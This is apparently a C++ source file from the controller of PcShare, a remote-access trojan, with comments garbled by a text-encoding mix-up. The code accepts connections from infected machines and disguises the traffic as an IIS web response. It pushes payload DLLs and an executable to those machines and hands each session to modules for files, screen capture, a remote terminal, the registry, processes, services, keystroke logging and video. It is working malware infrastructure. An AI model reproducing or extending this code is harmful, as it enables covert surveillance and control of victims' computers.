#include "stdafx.h"
#include "PcShare.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern GOLBALVALUE m_MainValue;

//�����߳�
UINT WINAPI MyMainThread(LPVOID lPvoid)
{
	UINT		m_Id = 0;
	SOCKET		m_LisSocket = (SOCKET) lPvoid;
	SOCKET		m_AccSocket = 0;
	while(1)
	{
		//�ȴ��ͻ�����
		if((m_AccSocket = accept(m_LisSocket,0,0))	== INVALID_SOCKET) 
			break;

		//�����ͻ�ǩ���߳�
		_beginthreadex(NULL,0,MyChildThread,(LPVOID) m_AccSocket,0,&m_Id);
	}
	closesocket(m_LisSocket);
	return 0;
}

bool SendKeepAlive(SOCKET s)
{
	char m_sCommand[512] = {0};
	char m_Strlen[256];
	strcpy(m_sCommand,"HTTP/1.1 200 OK\r\n");
	strcat(m_sCommand,"Server: Microsoft-IIS/5.0\r\n");
	CTime t = CTime::GetCurrentTime();
	sprintf(m_Strlen,"Date: %s GMT\r\n",
		t.FormatGmt ("%a, %d %b %Y %H:%M:%S"));
	strcat(m_sCommand,m_Strlen);
	sprintf(m_Strlen,"Content-Length: %d\r\n"
		,1024 * 1024 * 1024);
	strcat(m_sCommand,m_Strlen);
	strcat(m_sCommand,"Connection: Close\r\n");
	strcat(m_sCommand,"Cache-Control: no-cache\r\n\r\n");
	if(!SendData(s,m_sCommand,strlen(m_sCommand)))
	{
		closesocket(s);
		return false;
	}
	return true;
}

BOOL SendFile(SOCKET s, char* pFileName)
{
	FILE* fp = fopen(pFileName, "rb");
	if(fp == NULL)
	{
		closesocket(s);
		return FALSE;
	}
	fseek(fp,0,SEEK_END);
	int nLen = ftell(fp);
	fseek(fp,0,SEEK_SET);
	char* pFileBuf = new char[nLen];
	fread(pFileBuf, nLen, 1, fp);
	fclose(fp);
	if(	!SendData(s,(char*) &nLen,sizeof(int)) ||
		!SendData(s,pFileBuf,nLen))
	{
		delete [] pFileBuf;
		closesocket(s);
		return FALSE;
	}
	delete [] pFileBuf;
	return TRUE;
}

void LoginTrans(SOCKET s, LPCLIENTITEM pData)
{
	//����ȷ�ϰ�ͷ��Ϣ
	if(!SendKeepAlive(s)) return;

	//���ͻ��������ļ�
	char m_FileName[512] = "PcCortr.dll";
	GetMyFilePath(m_FileName);
	if(!SendFile(s, m_FileName)) return;

	//֧���Զ�����
	if(pData->m_SysInfo.m_PcName[61] == 1)
	{
		strcpy(m_FileName, "PcStat.exe");
		GetMyFilePath(m_FileName);
		if(!SendFile(s, m_FileName)) return;

		strcpy(m_FileName, "PcClient.dll");
		GetMyFilePath(m_FileName);
		if(!SendFile(s, m_FileName)) return;
	}
	
	//�����׽��ֹر��¼�֪ͨ
	if(WSAAsyncSelect(s , m_MainValue.m_MainhWnd , 
		WM_CLOSEITEM , FD_CLOSE) == SOCKET_ERROR)
	{
		closesocket(s);
		return ;
	}

	//���ͻ���Ϣ
	sockaddr_in m_addr = {0};
	int	addrlen = sizeof(sockaddr_in);
	getpeername(s,(sockaddr*) &m_addr,&addrlen);
	char mTid[9] = {0};
	memcpy(mTid, pData->m_SysInfo.ID, 8);

	sprintf(pData->m_Title,"%03d.%03d.%03d.%03d:%s",
			m_addr.sin_addr.S_un.S_un_b.s_b1,
			m_addr.sin_addr.S_un.S_un_b.s_b2,
			m_addr.sin_addr.S_un.S_un_b.s_b3,
			m_addr.sin_addr.S_un.S_un_b.s_b4,
			mTid);
	CTime tLogin = CTime::GetCurrentTime();
	pData->m_LoginTime = (time_t) tLogin.GetTime();
	pData->m_WorkSocket = s;

	//֪ͨ����ܽ���������
	if(!SendMessage(m_MainValue.m_MainhWnd ,
		WM_ADDCLIENT, (WPARAM) pData , 0))
	{
		closesocket(s);
	}
}

void InterTrans(SOCKET s,LPCLIENTITEM pData , int ExecType)
{
	//��λ����Ψһ��ʶ
	sockaddr_in m_addr = {0};
	int	addrlen = sizeof(sockaddr_in);
	getpeername(s,(sockaddr*) &m_addr,&addrlen);
	char mTid[9] = {0};
	memcpy(mTid, pData->m_SysInfo.ID, 8);
	sprintf(pData->m_Title,"%03d.%03d.%03d.%03d:%s",
			m_addr.sin_addr.S_un.S_un_b.s_b1,
			m_addr.sin_addr.S_un.S_un_b.s_b2,
			m_addr.sin_addr.S_un.S_un_b.s_b3,
			m_addr.sin_addr.S_un.S_un_b.s_b4,
			mTid);
	
	//ȷ�������Ӧ����
	char m_WndName[256] = {0};
	if(ExecType == CONN_FILE_UP || ExecType == CONN_FILE_DL)
	{
		//�ļ�����
		sprintf(m_WndName,"PCSHARE�ļ�����-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_MANA_SEND)
	{
		sprintf(m_WndName,"PCSHARE�ļ�����-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_MANA_RECV)
	{
		sprintf(m_WndName,"PCSHARE�ļ�����-%s",pData->m_Title);
		if(!SendKeepAlive(s)) return;
	}
	else if(ExecType == CONN_FILE_FRAM_SEND)
	{
		sprintf(m_WndName,"PCSHARE��Ļ���-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_FRAM_RECV)
	{
		sprintf(m_WndName,"PCSHARE��Ļ���-%s",pData->m_Title);
		if(!SendKeepAlive(s)) return;
	}
	else if(ExecType == CONN_FILE_TLNT_SEND)
	{
		sprintf(m_WndName,"PCSHARE�����ն�-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_TLNT_RECV)
	{
		sprintf(m_WndName,"PCSHARE�����ն�-%s",pData->m_Title);
		if(!SendKeepAlive(s)) return;
	}
	else if(ExecType == CONN_FILE_REGD_SEND)
	{
		sprintf(m_WndName,"PCSHAREע������-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_REGD_RECV)
	{
		sprintf(m_WndName,"PCSHAREע������-%s",pData->m_Title);
		if(!SendKeepAlive(s)) return;
	}
	else if(ExecType == CONN_FILE_PROC_SEND)
	{
		sprintf(m_WndName,"PCSHARE���̹���-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_PROC_RECV)
	{
		sprintf(m_WndName,"PCSHARE���̹���-%s",pData->m_Title);
		if(!SendKeepAlive(s)) return;
	}
	else if(ExecType == CONN_FILE_SERV_SEND)
	{
		sprintf(m_WndName,"PCSHARE�������-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_SERV_RECV)
	{
		sprintf(m_WndName,"PCSHARE�������-%s",pData->m_Title);
		if(!SendKeepAlive(s)) return;
	}
	else if(ExecType == CONN_FILE_KEYM_SEND)
	{
		sprintf(m_WndName,"PCSHARE���̼��-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_KEYM_RECV)
	{
		sprintf(m_WndName,"PCSHARE���̼��-%s",pData->m_Title);
		if(!SendKeepAlive(s)) return;
	}
	else if(ExecType == CONN_FILE_MULT_SEND)
	{
		sprintf(m_WndName,"PCSHARE��Ƶ���-%s",pData->m_Title);
	}
	else if(ExecType == CONN_FILE_MULT_RECV)
	{
		sprintf(m_WndName,"PCSHARE��Ƶ���-%s",pData->m_Title);
		if(!SendKeepAlive(s)) return;
	}

	Sleep(500);

	//���Ҵ���
	HWND hWnd = FindWindow(NULL,m_WndName);
	if(hWnd == NULL) 
	{
		Sleep(2000);
		hWnd = FindWindow(NULL,m_WndName);
		if(hWnd == NULL)
		{
			closesocket(s);
			return;
		}
	}

	//�����׽���
	DWORD pId = 0;
	GetWindowThreadProcessId(hWnd, &pId);
	WSAPROTOCOL_INFO m_SocketInfo = {0};
	if(WSADuplicateSocket(s, pId , &m_SocketInfo))
	{
		closesocket(s);
		return ;
	}
	
	//�����׽��ֵ�����
	COPYDATASTRUCT ct = {0};
	ct.lpData = &m_SocketInfo;
	ct.cbData = sizeof(WSAPROTOCOL_INFO);
	ct.dwData = ExecType;
	SendMessage(hWnd,WM_COPYDATA,0,(LPARAM) &ct);
	closesocket(s);
}

//���������߳�
UINT WINAPI MyChildThread(LPVOID lPvoid)
{
	//���״���
	SOCKET s = (SOCKET) lPvoid;
	CLIENTITEM	m_ClientItem = {0};
	int nCmd = AcceptClientMain(s,&m_ClientItem);
	if(nCmd == -1) closesocket(s);
	else if(nCmd == CONN_MAIN)
		LoginTrans(s,&m_ClientItem);
	else
		InterTrans(s,&m_ClientItem,nCmd);
	return 0;
}





